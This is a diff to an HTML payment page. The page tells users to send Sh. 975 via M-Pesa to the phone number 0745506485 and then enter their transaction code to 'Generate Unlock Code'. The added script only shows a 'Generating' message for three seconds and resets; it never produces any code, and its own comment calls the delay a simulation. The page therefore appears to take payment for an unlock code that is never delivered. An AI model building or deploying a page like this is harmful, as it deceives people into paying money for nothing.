@@ -100,11 +100,6 @@
             margin-top: 30px;
             text-align: left;
         }
-        .input-section label {
-            display: block;
-            margin-bottom: 5px;
-            font-size: 14px;
-        }
         .input-field {
             width: 100%;
             padding: 10px;
@@ -114,7 +109,14 @@
             color: #ffffff;
             font-size: 14px;
             box-sizing: border-box;
+        }
+        .error-message {
+            color: #e74c3c;
+            font-size: 12px;
+            margin-top: 5px;
             margin-bottom: 10px;
+            display: block;
+            height: 15px;
         }
         .generate-button {
             width: 100%;
@@ -143,7 +145,7 @@
         <p class="subtitle">Follow these simple steps to buy goods using M-Pesa</p>
 
         <div class="warning-box">
-            Always confirm the till number and amount before completing the transaction. (Amount: Sh. 975, Till Number: 4523484)
+            Always confirm the Phone number and amount before completing the transaction. (Amount: Sh. 975, Phone Number: 0745506485)
         </div>
 
         <div class="steps-container">
@@ -164,7 +166,7 @@
             <div class="step">
                 <div class="step-number">3</div>
                 <div class="step-text">
-                    <h4>Phone Number: 0745506485</h4>
+                    <h4>Enter phone Number: 0745506485</h4>
                     <p>Input the merchant's Phone number 0745506485</p>
                 </div>
             </div>
@@ -192,9 +194,38 @@
         </div>
 
         <div class="input-section">
-            <input type="text" class="input-field" placeholder="MPesa Code">
-            <button class="generate-button">Generate Unlock Code</button>
+            <input type="text" id="mpesaCodeInput" class="input-field" placeholder="MPesa Code">
+            <span id="errorMessage" class="error-message"></span>
+            <button id="generateButton" class="generate-button">Generate Unlock Code</button>
         </div>
     </div>
+
+    <script>
+        const generateButton = document.getElementById('generateButton');
+        const mpesaCodeInput = document.getElementById('mpesaCodeInput');
+        const errorMessage = document.getElementById('errorMessage');
+
+        generateButton.addEventListener('click', () => {
+            const code = mpesaCodeInput.value.trim();
+            errorMessage.textContent = ''; // Clear any previous message
+
+            if (code === '') {
+                errorMessage.textContent = 'Please enter a valid Mpesa code';
+                setTimeout(() => {
+                    errorMessage.textContent = '';
+                }, 2300); // Disappear after 2.3 seconds
+            } else {
+                // Change button text and disable it
+                generateButton.textContent = 'Generating Unlock code...';
+                generateButton.disabled = true;
+                
+                // Simulate a delay and then change the button back
+                setTimeout(() => {
+                    generateButton.textContent = 'Generate Unlock Code';
+                    generateButton.disabled = false;
+                }, 3000); // Wait 3 seconds before resetting
+            }
+        });
+    </script>
 </body>
 </html>
